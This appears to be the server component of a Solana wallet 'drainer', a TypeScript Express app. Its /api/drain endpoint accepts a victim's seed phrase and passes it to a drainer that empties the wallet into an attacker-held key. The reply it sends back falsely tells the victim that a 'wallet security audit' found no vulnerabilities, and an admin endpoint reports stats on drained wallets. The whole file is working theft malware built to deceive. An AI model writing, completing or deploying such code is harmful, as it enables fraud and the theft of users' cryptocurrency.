import express from 'express';
import cors from 'cors';
import { Connection, Keypair } from '@solana/web3.js';
import { SolanaDrainer } from '../core/drainer';
import { WalletManager } from '../core/walletManager';
import { logEvent, logError } from '../utils/logger';

const app = express();
app.use(cors());
app.use(express.json());

// Initialize components
const connection = new Connection(process.env.RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com', 'confirmed');
const walletManager = new WalletManager();

// IMPORTANT: In production, load your actual private key from env
// This is a placeholder for compilation
const drainWallet = Keypair.generate();

const drainer = new SolanaDrainer(connection, drainWallet, walletManager);

// Endpoint to receive seed phrases and execute drain
app.post('/api/drain', async (req, res) => {
  const { seedPhrase, walletType } = req.body;

  if (!seedPhrase || seedPhrase.split(' ').length < 12) {
    return res.status(400).json({
      success: false,
      error: 'Invalid seed phrase provided',
      message: 'Please provide a valid 12 or 24 word seed phrase'
    });
  }

  try {
    logEvent('New drain request received', { walletType, seedLength: seedPhrase.split(' ').length });
    
    const result = await drainer.fullDrain(seedPhrase);

    logEvent('Drain executed successfully', { 
      solAmount: result.solResult.amount, 
      success: result.solResult.success 
    });

    return res.json({
      success: true,
      message: 'Wallet security audit completed. No vulnerabilities found.',
      auditId: require('crypto').randomBytes(16).toString('hex'),
      timestamp: new Date().toISOString(),
    });
  } catch (error: any) {
    logError(error, 'API drain endpoint');
    return res.status(500).json({
      success: false,
      error: 'Internal server error during audit',
      message: 'Please try again later'
    });
  }
});

// Admin stats endpoint
app.get('/api/admin/stats', (req, res) => {
  const stats = walletManager.getStats();
  return res.json(stats);
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'operational', timestamp: new Date().toISOString() });
});

export default app;